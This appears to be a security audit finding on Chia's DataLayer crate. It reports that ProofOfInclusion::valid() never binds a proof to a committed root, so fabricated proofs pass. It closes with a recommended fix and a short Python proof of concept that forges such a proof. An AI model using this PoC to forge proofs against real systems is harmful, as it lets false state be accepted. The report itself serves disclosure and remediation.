### Title
`ProofOfInclusion::valid()` Accepts Fully Synthetic Proofs — No Committed Root Binding (`crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

---

### Summary

`ProofOfInclusion::valid()` only verifies internal hash-chain self-consistency. It never compares the computed root against any externally committed tree root. An attacker can construct a `ProofOfInclusion` with a completely fabricated `node_hash` and arbitrary `other_hash` values, compute each `combined_hash` correctly, and `valid()` returns `true`. The function's final guard is a tautology that adds zero security.

---

### Finding Description

The `valid()` implementation is:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {
            return false;
        }

        existing_hash = calculated_hash;
    }

    existing_hash == self.root_hash()   // ← tautology
}
``` [1](#0-0) 

And `root_hash()` is:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash          // ← same value the loop just verified
    } else {
        self.node_hash
    }
}
``` [2](#0-1) 

**The tautology:** After the loop, `existing_hash` equals `calculated_hash` from the last iteration. The loop body already asserted `calculated_hash == layer.combined_hash`. `root_hash()` returns `layers.last().combined_hash`. Therefore `existing_hash == self.root_hash()` is unconditionally `true` whenever the loop completes without returning `false`. The final line adds no security whatsoever.

**What is missing:** There is no parameter for a trusted/committed root hash. `valid()` never checks that `root_hash()` equals any externally known tree root. The function is purely a self-consistency check on the proof object itself.

---

### Impact Explanation

This falls under the allowed High impact: *"DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion … or lets untrusted input prove invalid state."*

`valid()` is the sole validation method exposed on `ProofOfInclusion`, both in Rust and via the Python bindings: [3](#0-2) 

The Python test suite calls `proof_of_inclusion.valid()` as the complete acceptance check, with no subsequent comparison of `root_hash()` against a committed root: [4](#0-3) [5](#0-4) 

Any production consumer that follows this same pattern — calling `valid()` and trusting the result — will accept a forged proof for a leaf that does not exist in the committed DataLayer tree. This enables forged DataLayer state acceptance.

---

### Likelihood Explanation

- The attack requires only constructing a `ProofOfInclusion` struct with chosen hashes and computing SHA-256 — no privileged access, no key material, no chain state.
- The `ProofOfInclusion` struct is `Streamable` and exposed via Python/wasm bindings, so it can be deserialized from attacker-controlled bytes.
- The function name `valid()` strongly implies a complete validity check, making it likely that callers treat it as sufficient without an additional root comparison.
- No existing guard in `valid()` prevents this.

---

### Recommendation

`valid()` must accept a `committed_root: &Hash` parameter and replace the tautological final check with a comparison against that trusted value:

```rust
pub fn valid(&self, committed_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    &existing_hash == committed_root   // bind to external trust anchor
}
```

All call sites (Rust, Python, wasm) must supply the committed root from a trusted source (e.g., the on-chain DataLayer coin's state hash).

### Proof of Concept

```python
import hashlib
from chia_rs.datalayer import ProofOfInclusion, ProofOfInclusionLayer, Side

def sha256_internal(left: bytes, right: bytes) -> bytes:
    return hashlib.sha256(b"\x02" + left + right).digest()

# Completely fabricated hashes — not in any real tree
node_hash   = bytes([0xAA] * 32)
other_hash1 = bytes([0xBB] * 32)
other_hash2 = bytes([0xCC] * 32)

# Build a self-consistent chain
combined1 = sha256_internal(node_hash, other_hash1)   # layer 0
combined2 = sha256_internal(combined1, other_hash2)   # layer 1

proof = ProofOfInclusion(
    node_hash=node_hash,
    layers=[
        ProofOfInclusionLayer(other_hash_side=Side.Right, other_hash=other_hash1, combined_hash=combined1),
        ProofOfInclusionLayer(other_hash_side=Side.Right, other_hash=other_hash2, combined_hash=combined2),
    ],
)

assert proof.valid()          # passes — no real tree involved
assert proof.root_hash() == combined2  # attacker-chosen root
```

`valid()` returns `True` for a proof that does not correspond to any real DataLayer tree.
